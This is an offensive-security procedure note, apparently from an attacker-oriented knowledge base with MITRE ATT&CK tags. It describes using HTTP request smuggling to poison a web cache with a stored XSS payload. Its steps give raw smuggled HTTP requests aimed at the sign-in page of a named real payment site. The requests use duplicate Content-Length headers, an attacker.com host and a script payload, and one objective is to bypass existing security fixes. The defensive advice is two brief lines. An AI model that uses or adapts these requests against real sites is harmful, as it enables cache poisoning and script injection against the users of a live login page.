---
tags:
  - stored-xss
  - content-injection
  - web-exploit
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
  - '[[tools/cURL]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-http-smuggling-test]]'
  - '[[commands/burp-request-manipulation]]'
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: 31f64c90-e2ad-4b86-b622-20bf127cdaa6
created_at: '2025-12-11T06:10:40.619Z'
updated_at: '2025-12-11T06:10:40.619Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1059.007]]'
---
# Inject Malicious Content via Smuggled Request

## Summary

This procedure uses a successful HTTP Request Smuggling to inject malicious content, such as XSS payloads, into the cached response of a legitimate page.

## Description

Building on smuggling, this injects attacker-controlled content into the cache, causing users to render malicious JavaScript or HTML when accessing pages like the signin form, leading to stored XSS.

## Requirements

1. Confirmed smuggling vulnerability
2. Tool: Burp Suite for precise request crafting
3. Target URL accessible

## Defense

Defensive measures and detection strategies:

- Use cache keys that include full request details
- Implement WAF rules for anomalous payloads

## Objectives

1. Inject XSS payload via smuggled request
2. Ensure cache stores the malicious content
3. Bypass existing security fixes

## Instructions

### Step 1: Craft Injection Payload

**Context**: Prepare the smuggled request with malicious content.

**Command** ([[commands/burp-request-manipulation]]):

```bash
# In Burp: Smuggle XSS payload
POST /signin HTTP/1.1
Host: paypal.com
Content-Length: 0
Content-Length: 50

GET / HTTP/1.1
Host: attacker.com

<script>alert('Stored XSS')</script>
```

> This injects the payload into the cache.

### Step 2: Trigger and Confirm Injection

**Context**: Request the page to verify injection.

**Command** ([[commands/burp-request-manipulation]]):

```bash
GET /signin HTTP/1.1
Host: paypal.com
```

> Check if the response includes the injected content.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques



## Commands Used

- [[commands/burp-request-manipulation]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[stored-xss]]
- [[content-injection]]
